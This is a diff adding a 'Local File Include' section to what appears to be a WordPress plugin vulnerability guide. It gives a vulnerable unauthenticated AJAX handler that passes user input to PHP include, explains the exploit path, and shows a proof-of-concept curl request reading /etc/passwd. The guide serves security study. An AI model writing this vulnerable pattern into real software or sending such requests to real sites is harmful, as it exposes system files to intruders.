@@ -3240,6 +3240,44 @@ function delete_author_user($request){
 curl [url]/myplugin/v1/delete/author -d "user_id=0"
 ```
 
+-----------
+
+### Local File Include
+
+------------
+
+- Vulnerable functions-:
+
+```php
+include()
+include_once()
+require()
+require_once()
+```
+
+- Vulnerable code-:
+
+```php
+add_action("wp_ajax_nopriv_render_lesson", "render_lesson_template");
+
+function render_lesson_template(){
+    $template_path      = urldecode( $_GET['template_path'] ?? '' );
+
+    // For custom template return all list of lessons
+    include $template_path;
+    die();
+}
+```
+
+- To exploit, a request will  be made to `/wp-admin/admin-ajax.php` with an action `render_lesson` since the hook is `wp_ajax_nopriv`, the attack does not require authentication.The hook call function `render_lesson_template` with query `template_path`  to passed to function `include()`.
+- Proof of Concept
+
+```bash
+curl [url]/wp-admin/admin-ajax.php?action=render_lesson&template_path=/etc/passwd
+```
+
+
+
 
 
 
